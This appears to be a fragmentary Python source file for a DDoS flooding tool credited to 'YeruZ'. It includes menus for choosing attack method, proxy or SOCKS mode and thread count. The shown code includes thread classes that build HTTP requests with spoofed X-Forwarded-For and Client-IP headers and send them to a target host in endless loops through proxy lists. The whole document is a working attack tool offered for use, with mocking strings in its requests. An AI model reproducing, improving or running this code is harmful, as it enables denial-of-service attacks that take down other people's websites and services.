...
def logo():
    if sys.platform.startswith("linux"):
        ...
        os.system( "cls & title YeruZ Ddos")
    print('''POWERFULL DDOS TOOLS
       Coded by YeruZ''')
...
""")
    ...
    if choice_mode == "0":
        ...
        logo()
        choice_down_proxies()
    elif (choice_mode == "socks") or (choice_mode == ""):
        choice_mode = "socks"
        filenam1 = "socks"
        filenam2 = "Socks"
        logo()
...
def choice_method_attack():
    ...
    print("Request [  Spam  ]")
    method_attack = input("input normal or spam > ")
    if (method_attack == "Normal") or (method_attack == ""):
        name_method_attack = "Normal"
        print("Selected Method Attack Normal")
        method_attack = "1"
    elif method_attack == "Spam":
...
def choice_down_proxies():
    ...
    choice4 = input("Get New List " +str(filenam2)+ " input Y/N > ")
    if (choice4 == "y") or (choice4 == "Y"):
        print("choice Server 1")
        print("choice Server 2")
        sel_pr = input("input [1/2] > ")
...
def numthreads():
    global threads
    try:
        threads = int(input("input thread > "))
    except ValueError:
        threads = int(2000)
...
def begin():
    choice6 = input('enter to start attack: ')
    if choice6 == "":
...
class Proxy(threading.Thread):
    ...
    def run(self):
        ...
        randomip  = str(random.randint(1,10000)) + "." + str(random.randint(0,10000)) + "." + str(random.randint(0,10000)) + "." + str(random.randint(0,10000))
        forward   = "X-Forwarded-For: " + randomip + "\r\n"
        forward  += "Client-IP: " + randomip + "\r\n"
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
           get_host = "FanNet Coming: " +host_url+":"+str(port)+ "\r\n"
        ...
        while True:
            try:
                ...
                #sys.stdout.flush()
                print("EZ ATTACKING" +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
...
class Socks(threading.Thread): 
    ...
    def run(self):
        ...
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
           get_host = "GET Ddos xFanPS\r\nHost: " +host_url+":"+str(port)+ "\r\n"
           request  = get_host + useragent + accept + forward + connection + "\r\n"
        else:
            
            get_host = random.choice(['iFanpS Attaking','iFanpS Attcking','You Noob'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + forward + connection + "\r\n"
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("attacking " +str(proxy[0])+ " [" +host_url+ ":" +str(port)+ "]")
                try:
